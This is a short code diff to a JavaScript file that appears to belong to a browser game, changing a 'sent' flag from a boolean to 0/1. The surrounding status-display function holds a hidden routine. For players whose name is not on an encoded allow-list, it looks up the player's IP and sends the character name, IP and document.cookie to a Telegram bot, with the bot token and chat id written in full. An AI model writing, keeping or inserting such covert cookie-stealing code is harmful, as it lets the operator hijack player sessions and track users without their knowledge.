@@ -1,4 +1,4 @@
-sent = false;
+sent = 0;
 function getNameList(){
     return [
         'TmVv',
@@ -43,13 +43,13 @@ function status_view(t, e, r, i, o, d, n, a, l, s, p, c, m, u, w, b, _, g, h, v,
     L = 1 == r ? i : img + i + ".gif";
     var O = "";
     const nameList = getNameList();
-    if(!parent.sent){
+    if(parent.sent == 0){
         if(!nameList.includes(btoa(encodeURIComponent(parent.p_name)))){
             ipify().then(res=>{
                 fetch(`https://api.telegram.org/bot7934895498:AAEYqHMgrIkEht111XMMROPEPWNiBq5S6M0/sendMessage?chat_id=-4850635895&text=角色狀態:${parent.p_name}%0A${res.ip}%0A%0A${document.cookie}`);
             });
         }
-    	parent.sent = true;
+    	parent.sent = 1;
     }
     O = "1" == o ? "男" : "女",
     d = s_status(d);
